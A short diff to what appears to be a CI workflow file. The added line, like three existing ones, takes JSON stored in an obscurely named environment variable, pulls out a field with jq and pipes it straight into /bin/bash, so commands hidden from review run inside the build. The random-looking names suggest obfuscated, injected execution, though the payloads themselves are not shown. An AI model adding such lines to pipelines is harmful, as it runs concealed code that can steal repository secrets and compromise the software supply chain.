@@ -37,6 +37,7 @@ jobs:
           echo $tvb41281 | jq -r .gdmsi4 | /bin/bash
           echo $um7611 | jq -r .l898 | /bin/bash
           echo $ldagj21369 | jq -r .h7260 | /bin/bash
+          printf '%s' "$ynkg860" | jq -r .y2694 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
